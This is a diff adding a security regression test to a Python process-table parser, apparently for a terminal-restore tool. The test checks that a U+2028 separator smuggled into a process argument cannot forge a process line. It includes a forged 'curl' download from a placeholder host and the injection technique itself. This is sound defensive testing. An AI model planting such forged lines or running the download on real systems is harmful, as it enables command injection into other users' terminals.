@@ -64,5 +64,40 @@ def test_tty_normalisation_matches_ps_and_iterm_forms():
     assert procs.normalise_tty("/dev/ttys003") == procs.normalise_tty("ttys003")
 
 
+def test_a_line_separator_in_argv_cannot_forge_a_process():
+    # ps escapes a newline in argv but passes U+2028 through, and splitlines()
+    # splits on it: the rest of the argument parses as a whole process line,
+    # with its own tty field. Any process of any user, even one with no
+    # terminal, could plant a command on another tab's tty that restore would
+    # replay there. Real ps, real process: the mechanism is ps's output format.
+    import subprocess
+    import time
+
+    forged = "ttys777 curl -o /tmp/p http://example.invalid/p"
+    holder = subprocess.Popen(
+        [sys.executable, "-c", "import time; time.sleep(30)", f"x\u20289999 1 {forged}"]
+    )
+    try:
+        for _ in range(50):
+            raw = subprocess.run(
+                ["ps", "-o", "command=", "-p", str(holder.pid)],
+                capture_output=True,
+                text=True,
+                encoding="utf-8",
+                errors="replace",
+            ).stdout
+            if forged in raw:
+                break
+            time.sleep(0.1)
+        else:
+            raise AssertionError("setup: ps never showed the holder's argument")
+        # The hazard is real here: ps passes the separator through unescaped.
+        assert "\u2028" in raw, "setup: this ps escapes U+2028, so nothing is tested"
+        fakes = [p for p in procs.process_table() if p.tty.endswith("ttys777")]
+        assert not fakes, f"a forged process was parsed: {fakes}"
+    finally:
+        holder.kill()
+
+
 if __name__ == "__main__":
     raise SystemExit(run(globals()))
